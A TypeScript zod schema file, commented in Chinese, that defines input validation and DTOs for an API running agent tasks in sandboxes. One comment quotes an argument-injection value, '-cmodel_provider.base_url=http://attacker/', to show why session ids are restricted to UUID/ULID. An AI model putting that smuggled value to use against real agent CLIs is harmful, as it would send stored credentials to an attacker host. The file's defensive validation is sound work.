import { z } from 'zod';
import { IsoInstantSchema } from './primitives';

/**
 * 无头 Task 的对外契约(S6)。REST 面见 27 §2 `runAgentTask` 行,WS 面见 `ws-protocol.ts`
 * 的 `/tasks` 频道。
 *
 * ⚠️ 这是平台**第一次把执行能力对外开放**——在此之前 REST 只有沙箱增删查、MCP 只有 3 个
 * 沙箱工具,外部调用者碰不到"在沙箱里跑东西"。因此本文件里的输入校验不是形式主义:
 * `extraArgs` 走白名单而不是自由数组,`prompt` 有长度上限,理由见各字段注释。
 */

/** 任务终态与运行态。`killed` 与 `timed_out` 分开:前者是人为,后者是硬超时(03 §8.3)。 */
export const TaskStatusSchema = z.enum(['running', 'succeeded', 'failed', 'killed', 'timed_out']);
export type TaskStatus = z.infer<typeof TaskStatusSchema>;

/**
 * 硬超时档位,与 `sandboxes.timeout_minutes` 同一套口径(13 §2.1 / P20 §0)。
 *
 * ⚠️ 选 120/240 的前提是 provider 已按「生存义务」把沙箱侧的会话闲置 TTL 设大
 * (04 §2.6 ★★★)——否则作业会在第 1 小时被沙箱自己回收。这一条由 provider 保证,
 * 不由调用方操心,但它是这两档能出现在这里的**唯一**理由。
 */
export const TaskTimeoutMinutesSchema = z.union([
  z.literal(30),
  z.literal(60),
  z.literal(120),
  z.literal(240),
]);

/**
 * `extraArgs` 的白名单。
 *
 * ⚠️ **绝不能收自由字符串数组**:它会被拼进 CLI 的 argv,等于把"在沙箱里执行任意命令"
 * 开放给任何能调这个端点的人。而且 argv 在沙箱内 `ps` / `/proc/<pid>/cmdline` 全文可见
 * (04 §2.3★ 第 2 条)。所以只放行平台理解、且与执行无关的少数几个。
 * 需要新增时:先想清楚"调用方能用它做到什么",再加进这个枚举。
 *
 * ⏳ **待办(已登记,本期不做)**:这份枚举现在被**前后端各硬编码一份**,与平台其他
 * 扩展点"registry 是开放集、由服务端下发"的做法不一致(04 §8)。将来应由服务端下发
 * (例如挂在 `GET /api/providers` 同款的能力发现面上),前端不再持有副本。之所以现在
 * 不做:白名单一共 1 个值,提前造下发机制等于用猜测把它的形状钉死——与 04 §2.6
 * 「`watch` 今天没有用户,现在加等于用猜测定形状」是同一条纪律。
 */
export const TaskExtraArgSchema = z.enum(['--verbose']);

/**
 * CLI 会话 id 的形状。两个内置 CLI 都发 UUID(codex 是 UUIDv7,claude 是 v4),
 * ULID 一并放行以免绑死某一家的实现细节。
 *
 * ⚠️ **这不是洁癖,是把 `resumeFrom` 关回"数据"里**。它会作为**位置参数**进 argv,
 * 而 clap 把任何以 `-` 开头的 token 读成**选项**——`resumeFrom:
 * "-cmodel_provider.base_url=http://attacker/"` 就是一条 codex 配置覆盖,而 codex 的
 * 凭证在 `~/.codex/auth.json`,改掉 base_url 等于把注入的密钥发去攻击者端点。
 * 换句话说:一个没有格式校验的 `z.string()` 直接绕过了 `extraArgs` 那份白名单存在的
 * 全部理由。adapter 侧另有 `--` 终止符 + 同一条正则的二次断言(纵深防御)。
 */
export const SESSION_REF_RE =
  /^(?:[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}|[0-7][0-9A-HJKMNP-TV-Z]{25})$/;

export const SessionRefSchema = z
  .string()
  .regex(SESSION_REF_RE, 'resumeFrom must be a CLI session id (UUID or ULID)');

/**
 * 后端在终态帧/DTO 上真正会发出的错误码闭集。
 *
 * ⚠️ **它是枚举而不是 `z.string()`,理由是前端要能吃**。前端词表里一个都没有这些码时,
 * `errorCode` 只是一段永远命中不了的 fallback;两边各抄一份表则必然漂移。定义成 zod
 * enum 挂在 DTO 上,它就会进 openapi ⇒ 前端从生成类型直接拿到闭集,并能用 `satisfies`
 * 把自己的文案表咬死——少一条编译不过。
 *
 * 前四条是**正常终态**(`TASK_${status.toUpperCase()}`);其余是平台侧兜底与 provider
 * 传上来的失败原因(`SandboxProviderErrorCode` 全集 + 恢复路径自己的两条)。
 */
export const TaskErrorCodeSchema = z.enum([
  // 正常终态(succeeded 没有 errorCode)
  'TASK_FAILED',
  'TASK_KILLED',
  'TASK_TIMED_OUT',
  // 平台侧恢复路径
  'SANDBOX_GONE',
  'RESUME_FAILED',
  /**
   * 任务命名的 runtime 在注册表里没有(`UnknownRuntimeError`,04 §8)。
   *
   * ⚠️ **它必须与 `INSTALL_FAILED` 分开**,而不是复用。二者的用户可见含义相反:
   * 「装这个 CLI 没装成」是可重试的环境问题;「根本没有这个 runtime」是入参问题,
   * 重试一万次也不会让适配器出现在注册表里。之前它们共用一个码,于是前端对
   * `runtime: 'shell'` 渲染出「运行时 CLI 安装失败(该镜像未预装,现装未成功)」——
   * 一句关于从未发生过的安装的话。
   *
   * 创建面已经在门口 400 拦掉(14 §10),所以这条码在**新建**路径上不该再出现;
   * 它留给另外两个入口:重启后 resume 一个 runtime 已被卸载的任务、以及终端 attach。
   */
  'UNKNOWN_RUNTIME',
  // provider 契约错误(SandboxProviderErrorCode 全集)
  'IMAGE_PULL_FAILED',
  /** 钉住的 digest 在上游已消失(04 §7 时刻④ 按 `ref@digest` 拉取才会出现的失败态)。 */
  'IMAGE_DIGEST_GONE',
  'RESOURCE_EXHAUSTED',
  'NOT_FOUND',
  'ALREADY_EXISTS',
  'TIMEOUT',
  'PERMISSION_DENIED',
  'INVALID_STATE',
  'PROVIDER_UNAVAILABLE',
  'UNSUPPORTED_CAPABILITY',
  'INTERNAL',
]);
export type TaskErrorCode = z.infer<typeof TaskErrorCodeSchema>;

export const RunAgentTaskSchema = z.object({
  /** 指令正文。上限与 `initialPrompt` 同(10 §7.3「≤8000 字符」),两处必须同步。 */
  prompt: z.string().min(1).max(8000),
  timeoutMinutes: TaskTimeoutMinutesSchema.optional(),
  /**
   * 上一轮的会话引用(`RuntimeTaskSpec.resumeFrom`)。给了就是接着上次聊。
   * 平台会比对 CLI 回显的 id 确认**真的续上了**,而不是假定(04 §3 ★4)。
   */
  resumeFrom: SessionRefSchema.optional(),
  extraArgs: z.array(TaskExtraArgSchema).max(4).optional(),
});
export type RunAgentTaskInput = z.infer<typeof RunAgentTaskSchema>;

/** 产物条目。`name` 是相对产物目录的路径,不是绝对路径——绝对路径不该外泄。 */
export const TaskArtifactSchema = z.object({
  name: z.string(),
  size: z.number().int().nonnegative(),
  /**
   * 文件 mtime。**给不出就缺席，⛔ 不发空串**（2026-09-05 修）。
   *
   * ── 它此前是什么样 ────────────────────────────────────────────────────────
   * 原本是裸 `z.string()`，并配着一段注释解释「为什么不能标 `format: date-time`」：
   * 它不是平台自己 `toISOString()` 出来的，而是沙箱内 agent 报的 mtime 经归一，
   * `aio-files.ts` / `boxlite-files.ts` 都写着 `epochSecondsToIso(...) ?? ''` ——
   * provider 给不出可解析的 mtime 时发的是**空串**。那段注释是诚实的，但它诚实地
   * 描述了一个不该存在的取值。
   *
   * ⛔ **空串是一个伪装成数据的谎**：前端拿它直接渲染（`TaskOutcome.view` 那一格），
   * 界面上是一片空白 —— 用户分不清「这个文件没有时间戳」与「这一格渲染坏了」；
   * 谁要是 `new Date(a.modifiedAt)`，拿到的是 `Invalid Date`。
   *
   * ⇒ 按本仓一贯的那条（`sizeBytes: null` 不是 0、`hvSupport: null` 不是 false、
   * reflink 三态）：**给不出就缺席**。缺席时前端显式渲染「时间未知」，类型系统逼它处理。
   *
   * ⚠️ 于是它现在**配得上** `IsoInstantSchema`：出现即必是合法瞬时，不出现即是没有。
   */
  modifiedAt: IsoInstantSchema.optional(),
});
export type TaskArtifactDto = z.infer<typeof TaskArtifactSchema>;

export const AgentTaskDtoSchema = z.object({
  id: z.string(),
  sandboxId: z.string(),
  runtime: z.string(),
  status: TaskStatusSchema,
  /**
   * 仅终态有意义,且**可能缺席**——被信号杀掉的进程没有正常退出码。调用方把缺席
   * 当作非零退出,而不是"还没结束"(与 `JobChunk.exitCode` 同一条纪律)。
   */
  exitCode: z.number().int().optional(),
  /** CLI 自己的会话 id,下一轮填进 `resumeFrom` 即可续接。 */
  sessionRef: z.string().optional(),
  /**
   * 这次运行的硬超时档位。
   *
   * 有它前端才能算倒计时:只有 `startedAt` 只能显示"已经跑了多久",显示不了"还剩多久"
   * ——而后者正是用户在一个可能跑 4 小时的任务上想知道的那件事。它是**发起时定下的预算**,
   * 不随运行改变。
   */
  timeoutMinutes: TaskTimeoutMinutesSchema,
  /**
   * 平台侧事件序号的**当前上界**。
   *
   * ⚠️ **它不是恢复点,不要拿它当 `fromSeq` 用**(此处原注释写错过,已更正):
   * `TaskClientFrame.subscribe.fromSeq` 是**排他**语义("我已经有到 N 为止的了"),
   * 而这里的 `lastSeq` 是平台**已经产出到第几条**。把它填进 `fromSeq`,对一个还没
   * 收过任何事件的前端来说,后端会正确地"一条都不回放"——面板空白,且看起来像后端
   * 丢了数据。它真正的用途只有一个:**体检上界**——拿自己收到的最大 seq 与它比,
   * 判断自己是不是落后了、要不要重连补齐。
   */
  lastSeq: z.number().int().nonnegative(),
  artifacts: z.array(TaskArtifactSchema),
  /**
   * 失败时的错误码(永远是码,不是句子),前端据此渲染人话(P22 §1)。
   * 闭集,见 `TaskErrorCodeSchema` ——它进 openapi,前端由此拿到可 `satisfies` 的类型。
   */
  errorCode: TaskErrorCodeSchema.optional(),
  startedAt: IsoInstantSchema,
  finishedAt: IsoInstantSchema.optional(),
});
export type AgentTaskDto = z.infer<typeof AgentTaskDtoSchema>;
